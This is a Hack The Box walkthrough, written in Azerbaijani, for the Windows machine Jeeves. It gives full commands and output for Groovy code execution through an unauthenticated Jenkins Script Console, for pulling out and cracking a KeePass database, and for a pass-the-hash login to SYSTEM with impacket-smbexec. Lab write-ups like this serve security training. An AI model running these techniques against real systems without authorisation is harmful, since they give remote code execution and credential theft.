# Jeeves (HTB)

> Platforma: Hack The Box  
> OS: Windows  
> Çətinlik: Orta  
> Nəticə: Administrator

---

## Hücum Zənciri

```text
Kəşfiyyat
  |-- nmap -p- -> 80 (IIS 10.0 Ask Jeeves), 135, 445, 50000 (Jetty 9.4.z)
  |-- 50000-də qovluq bürutmə -> /askjeeves (Jenkins 2.87)
İlkin Giriş
  |-- /askjeeves/script ünvanında anonim Script Console
  |-- Groovy icrası -> jeeves\kohsuke adından əmr icrası
  |-- C:\Users\kohsuke\Desktop\user.txt-dən user flag oxunması
Səlahiyyətlərin Artırılması
  |-- C:\Users\kohsuke\Documents-də KeePass bazası CEH.kdbx
  |-- keepass2john + john -> master parol <KEEPASS_PASSWORD>
  |-- KeePass-dən Administrator-un NT heşi çıxarılır
  |-- -hashes ilə impacket-smbexec -> SYSTEM shell
  |-- dir /R -> hm.txt:root.txt:$DATA (alternate data stream)
  |-- ADS-dən root flag oxunması
```

> [!NOTE]
> Bütün bayraqlar, şifrələr, heşlər və sessiya tokenləri etik səbəblərə görə gizlədilmişdir.

---

## Maşın Brifinqi

Jeeves - 80 portunda IIS, 445 portunda SMB və yüksək portda Jetty qaldıran Windows hostdur. Jetty qeyri-standart context path arxasında gizlədilmiş Jenkins quraşdırmasını host edir. Jenkins Groovy Script Console-a anonim girişə icazə verir və bu, servis hesabı adından birbaşa əmr icrası verir. Bu kontekstdən istifadəçi profilindəki KeePass bazası lokal administratorun NT heşini verir və həmin heş pass-the-hash vasitəsilə təkrar istifadə olunur. Yekun root flag administratorun iş stolundakı zərərsiz görünən mətn faylına əlavə edilmiş alternate data stream-də saxlanılır.

## Kəşfiyyat

Tam TCP skanı və servis aşkarlanması:

```bash
$ nmap -p- --min-rate 5000 -Pn 10.129.228.112
...
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
```

80 portu "Ask Jeeves" başlıqlı kiçik statik səhifə qaytarır. 50000 portu kökdə 404 qaytaran Jetty konteyneridir. Nə qovluq siyahısı, nə də HTTP başlıqları Jenkins context path-ni birbaşa açmır, ona görə hər iki səthi kiçik sözlüklə fuzz edirik:

```bash
$ gobuster dir -q -u http://10.129.228.112:50000/ -w /usr/share/wordlists/dirb/common.txt -t 30
...
/askjeeves  (Status: 302)
```

Redirect-i izləmək /askjeeves/ ünvanındakı Jenkins idarə panelinə gətirir. Səhifənin altlığında "Jenkins ver. 2.87" göstərilir. Yuxarı sağ küncdə "log in" görünür, yəni anonim hesabdan istifadə olunur. /askjeeves/script sorğusu HTTP 200 qaytarır və Groovy Script Console-u autentifikasiya olmadan render edir.

## İlkin Giriş

No CVE (custom vulnerability) - Jenkins Groovy Script Console autentifikasiya olmadan açıqdır; inzibati interfeysə anonim giriş Jenkins servis hesabı adından ixtiyari Groovy kodunun icrasına imkan verir.

Script Console script=<groovy code> formasında POST qəbul edir. Jenkins CSRF crumb tələb edir, ona görə əvvəlcə sessiya cookie-si və crumb alırıq:

```bash
$ cookie=$(mktemp)
$ crumb=$(curl -s -c $cookie -b $cookie -A 'Mozilla/5.0' \
    http://10.129.228.112:50000/askjeeves/script \
    | grep -oP 'Jenkins-Crumb", "\K[^"]+')
$ echo $crumb
<JENKINS_CRUMB>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Əmr icrasını zərərsiz əmrlə təsdiqləyirik:

```bash
$ curl -s -b $cookie -A 'Mozilla/5.0' -H "Jenkins-Crumb: $crumb" \
    --data-urlencode 'script=println "whoami".execute().text' \
    http://10.129.228.112:50000/askjeeves/script \
    | sed -n '/<h2>Result<\/h2><pre>/,/<\/pre>/p' | sed '1s/.*<pre>//; $s/<\/pre>.*//'
jeeves\kohsuke
```

Servis hesabı jeeves\kohsuke-dir. Eyni Groovy kanalı ilə profili siyahıya alır və user flag oxuyuruq:

```bash
$ curl ... --data-urlencode 'script=println new File("C:/Users/kohsuke/Desktop/user.txt").text' ...
<USER_FLAG>
```

Documents qovluğunda səlahiyyətlərin artırılması üçün KeePass bazası var:

```bash
$ curl ... --data-urlencode 'script=println new File("C:/Users/kohsuke/Documents").list().join("\n")' ...
AppData
Desktop
Documents
...
```

## Səlahiyyətlərin Artırılması

C:/Users/kohsuke/Documents/CEH.kdbx faylını hücum edən hosta köçürürük. Ən sadə yol - Script Console vasitəsilə faylı base64-ə kodlaşdırıb lokal olaraq yapışdırmaqdır:

```bash
$ curl ... --data-urlencode 'script=println new File("C:/Users/kohsuke/Documents/CEH.kdbx").bytes.encodeBase64().toString()' ... > kdbx.b64
$ base64 -d kdbx.b64 > CEH.kdbx
$ file CEH.kdbx
CEH.kdbx: Keepass password database 2.x KDBX
```

Heşi çıxarırıq və master parolu John ilə sındırırıq:

```bash
$ keepass2john CEH.kdbx > ceh.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt ceh.hash
...
<KEEPASS_PASSWORD>       (CEH)
$ john --show ceh.hash
CEH:<KEEPASS_PASSWORD>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Bazanı keepassxc-cli ilə açırıq. "Backup stuff" qeydi lokal administratorun NT heşini saxlayır:

```bash
$ keepassxc-cli show -s -a Password CEH.kdbx "Backup stuff"
<ADMIN_NT_HASH>
```

Heşi pass-the-hash vasitəsilə təkrar istifadə edirik. wmiexec bu hostda asılır, smbexec isə işləyir, çünki hədəfdə yalnız cmd.exe tələb edir:

```bash
$ impacket-smbexec -hashes '<ADMIN_NT_HASH>' \
    -dc-ip 10.129.228.112 'jeeves/Administrator@10.129.228.112'
C:\Windows\system32>
```

Administratorun iş stolundakı alternate data stream-ləri siyahıya alırıq:

```text
C:\Windows\system32> cmd.exe /c dir /R C:\Users\Administrator\Desktop
...
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
...
```

Gizli stream-i oxuyuruq:

```text
C:\Windows\system32> cmd.exe /c powershell -c "Get-Content -Path C:\Users\Administrator\Desktop\hm.txt -Stream root.txt"
<ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

## Bayraqlar

| Bayraq | Dəyər |
|--------|-------|
| User | `<USER_FLAG>` |
| Root | `<ROOT_FLAG>` |

## Əsas Nəticələr

- Jenkins Script Console yüksək təsirli tapıntıdır. Əgər anonim əlçatandırsa, bu Jenkins versiyasından asılı olmayaraq birbaşa RCE primitividir.
- wmiexec Win32_Process.Create-ə əsaslanır və Defender və ya yavaş WMI provayderi arxasında tez-tez asılır; smbexec daha yüngül alternativdir, ona yalnız SMB və cmd.exe lazımdır.
- Pass-the-hash lokal Administrator hesablarına qarşı açıq parol bilinməsə belə işləyir, kifayətdir ki, NTLM heşi əldə olunsun.
- Alternate data streams standart olaraq `dir` və `Get-Content`-də görünmür. `dir /R` və `Get-Content -Stream <name>` onları siyahıya almaq və oxumaq üçün kanonik üsuldur.
- İstifadəçi profillərindəki KeePass bazaları həm CTF-də, həm də real incident response işlərində tez-tez rast gəlinən tapıntıdır; post-exploitation mərhələsində həmişə `.kdbx` fayllarını yoxla.
